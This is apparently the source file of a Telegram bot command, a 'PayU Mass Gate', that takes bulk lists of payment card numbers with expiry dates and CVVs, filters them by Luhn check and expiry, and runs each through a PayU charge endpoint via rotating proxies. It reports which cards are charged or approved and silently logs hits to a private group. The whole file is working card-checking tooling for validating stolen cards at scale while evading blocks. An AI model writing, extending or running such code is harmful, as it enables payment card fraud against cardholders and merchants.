
import asyncio
import re
import time
import random
import os
import json
import itertools
import threading
import urllib.request
import urllib.parse
from datetime import datetime

from aiogram import types, F, Router

from database import is_gate_enabled, get_user_credits, is_owner_user
from sub import get_premium_status
from proxy_pool import get_user_proxies
from proxy import parse_proxy_input


def _norm_proxy(proxy):
    try:
        parsed = parse_proxy_input(proxy)
        if parsed and parsed.get("url_format"):
            return parsed["url_format"]
    except Exception:
        pass
    return proxy
from mass_gates._batch_common import show_selection, handle_result_callback, handle_stop_callback, GATE_GROUP_LOG

# silent group log for PayU hits (charged/approved -> this group + pinned)
PAYU_GROUP_ID = -1004453592223
GATE_GROUP_LOG["mpu"] = PAYU_GROUP_ID
from mass_gates._tg_helpers import safe_reply

router = Router()

# ── PayU API (local, like rz) ───────────────────────────────────────────
PU_API = os.environ.get("PU_API", "http://127.0.0.1:9200")

# ── MinecraftEnchanted custom emoji IDs ─────────────────────────────────
EMOJI_DIAMOND  = "5323344825016166715"   # 💎
EMOJI_SHIELD   = "5323325115411245266"   # 🛡
EMOJI_FIRE     = "5323776971740588381"   # 🔥
EMOJI_PICKAXE  = "5323815076690440002"   # ⛏️
EMOJI_COMPASS  = "5323308163175327669"   # 🧭

_STOP_EVENT = threading.Event()
MAX_VALID_CARDS = 5000
PU_WORKERS = int(os.environ.get("PU_WORKERS", "5"))   # per-user PayU worker cap


def stop_all():
    _STOP_EVENT.set()


# module-level state consumed by check_fn
_proxies = []
_amount_override = None
_proxy_ctr = itertools.count()
_proxy_paused_until = {}
_proxy_uses = {}
_guard = threading.Lock()


def _next_proxy():
    global _proxies
    if not _proxies:
        return None
    now = time.time()
    for _ in range(len(_proxies)):
        cand = _proxies[next(_proxy_ctr) % len(_proxies)]
        if _proxy_paused_until.get(cand, 0) <= now:
            return cand
    return _proxies[next(_proxy_ctr) % len(_proxies)]


def _pause_proxy(proxy, seconds):
    with _guard:
        _proxy_paused_until[proxy] = time.time() + seconds


def luhn_check(card_number):
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    rd = card_number[::-1]
    for i, ch in enumerate(rd):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0


def is_expired(mm, yy):
    try:
        now = datetime.now()
        cy = now.year % 100
        cm = now.month
        ey, em = int(yy), int(mm)
        return ey < cy or (ey == cy and em < cm)
    except Exception:
        return False


def extract_cards(text):
    pattern = r'(\d{13,19})\s*[|/\\:\s]\s*(\d{1,2})\s*[|/\\:\s]\s*(\d{2,4})\s*[|/\\:\s]\s*(\d{3,4})'
    cards = []
    for m in re.findall(pattern, text):
        cc, mm, yy, cvv = m
        mm = mm.zfill(2)
        if len(yy) == 4:
            yy = yy[2:]
        cards.append(f"{cc}|{mm}|{yy}|{cvv}")
    return cards


def check_fn(card):
    """Sync single-card check against the PayU API. Returns
    (status, msg, brand, amount, real_response)."""
    if _STOP_EVENT.is_set():
        return "STOPPED", "Stopped", "UNKNOWN", 0, ""
    proxy = _next_proxy()
    if proxy is None:
        return "ERROR", "No proxies — add via /proxy", "UNKNOWN", 0, ""
    amount = _amount_override or "1"
    proxy = _norm_proxy(proxy)
    try:
        q = urllib.parse.urlencode({"cc": card, "proxy": proxy, "amount": amount, "key": "ladle"})
        url = f"{PU_API}/payu?{q}"
        resp = urllib.request.urlopen(url, timeout=200)
        data = json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try:
            data = json.loads(e.read().decode())
        except Exception:
            data = {}
    except Exception as e:
        # dead/blocked proxy -> pause, retry the same card
        _pause_proxy(proxy, random.randint(60, 180))
        return "ERROR", f"API: {str(e)[:60]}", "UNKNOWN", 0, ""

    response_code = str(data.get("response_code") or data.get("response") or "ERROR").upper()
    status = str(data.get("response") or "error").lower()   # CHARGED/APPROVED/DECLINED/ERROR
    real = str(data.get("real_response") or "N/A")
    amount_str = str(data.get("amount") or "0.00")

    if "proxy" in str(data.get("response_code") or "").lower() or status == "error" and "proxy" in (data.get("real_response") or "").lower():
        _pause_proxy(proxy, random.randint(60, 180))

    if status == "charged":
        return "CHARGED", response_code, "CHARGED", amount_str, real
    if status == "approved":
        return "APPROVED", response_code, "APPROVED", amount_str, real
    if status == "declined":
        return "DECLINED", response_code, "UNKNOWN", amount_str, real
    return "ERROR", response_code, "UNKNOWN", amount_str, real


@router.message(F.text.startswith("/mpu") | F.caption.startswith("/mpu"))
async def mpu_command(message: types.Message):
    global _amount_override, _proxies
    _STOP_EVENT.clear()

    if not await asyncio.to_thread(is_gate_enabled, "mpu"):
        await safe_reply(message, f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji> <b>𝗣𝗮𝘆𝗨 𝗠𝗮𝘀𝘀 𝗚𝗮𝘁𝗲 𝘂𝗻𝗱𝗲𝗿 𝗠𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>', parse_mode="HTML")
        return

    user = message.from_user
    user_id = user.id
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)

    raw_text = ""
    cmd_text = message.text or message.caption or ""
    parts = cmd_text.split(maxsplit=1)
    if len(parts) > 1:
        raw_text += parts[1] + " "
    if message.reply_to_message:
        rm = message.reply_to_message
        if rm.text:
            raw_text += rm.text + " "
        elif rm.caption:
            raw_text += rm.caption + " "

    document = message.document
    if not document and message.reply_to_message:
        document = message.reply_to_message.document
    if document:
        try:
            fi = await message.bot.get_file(document.file_id)
            data = await message.bot.download_file(fi.file_path)
            raw_text += data.read().decode('utf-8', errors='ignore')
        except Exception as e:
            await safe_reply(message, f"❌ Error reading file: {e}")
            return

    amt_match = re.search(r'amount\s*=\s*(\d+(?:\.\d+)?)', raw_text, re.I)
    if amt_match:
        _amount_override = amt_match.group(1)
        raw_text = raw_text[:amt_match.start()] + " " + raw_text[amt_match.end():]
    else:
        _amount_override = None

    if not raw_text.strip():
        await safe_reply(message,
            f'<tg-emoji emoji-id="{EMOJI_PICKAXE}">⛏️</tg-emoji> <b>𝗡𝗼 𝗰𝗮𝗿𝗱𝘀 𝗳𝗼𝘂𝗻𝗱.</b>\n\n'
            "• <code>/mpu cc|mm|yy|cvv</code>\n"
            "• Reply to cards with <code>/mpu</code>\n"
            "• Send .txt file with <code>/mpu</code>\n"
            "• Add <code>amount=2</code> to override amount (USD)",
            parse_mode="HTML")
        return

    extracted = extract_cards(raw_text)
    valid = []
    for c in extracted:
        cc, mm, yy, cvv = c.split('|')
        if luhn_check(cc) and not is_expired(mm, yy):
            valid.append(c)
        if len(valid) >= MAX_VALID_CARDS:
            break

    if not valid:
        await safe_reply(message, "❌ No valid cards to check.", parse_mode="HTML")
        return

    # user's OWN global proxy pool (not rz_pxy.txt)
    _proxies = await get_user_proxies(user_id)
    if not _proxies:
        await safe_reply(message,
            f'<tg-emoji emoji-id="{EMOJI_COMPASS}">🧭</tg-emoji> <b>𝗡𝗼 𝗽𝗿𝗼𝘅𝗶𝗲𝘀!</b>\n\n'
            "𝗔𝗱𝗱 𝗽𝗿𝗼𝘅𝗶𝗲𝘀 𝘄𝗶𝘁𝗵 <code>/proxy</code> (𝗼𝗻𝗲 𝗽𝗲𝗿 𝗹𝗶𝗻𝗲).",
            parse_mode="HTML")
        return

    total = len(valid)
    current_credits = await asyncio.to_thread(get_user_credits, user_id)
    if current_credits < total:
        await safe_reply(message,
            f"❌ <b>𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗖𝗿𝗲𝗱𝗶𝘁𝘀</b>\n\n"
            f"You need <b>{total}</b> credits to check <b>{total}</b> cards.\n"
            f"Your balance: <b>{current_credits}</b> credits.",
            parse_mode="HTML")
        return

    plan_name = "OWNER" if is_owner_user(user_id) else ("PREMIUM" if is_premium else "FREE")

    await show_selection(
        message, valid, check_fn,
        f"𝐏𝐚𝐲𝐔 𝐌𝐚𝐬𝐬 (${_amount_override})" if _amount_override else "𝐏𝐚𝐲𝐔 𝐌𝐚𝐬𝐬 ($1)",
        user_id, user, "mpu", plan_name,
        max_workers=PU_WORKERS,
    )


@router.callback_query(F.data.startswith("mpu_res_"))
async def mpu_result(callback: types.CallbackQuery):
    await handle_result_callback(callback)


@router.callback_query(F.data.startswith("mpu_stop_"))
async def mpu_stop(callback: types.CallbackQuery):
    await handle_stop_callback(callback)
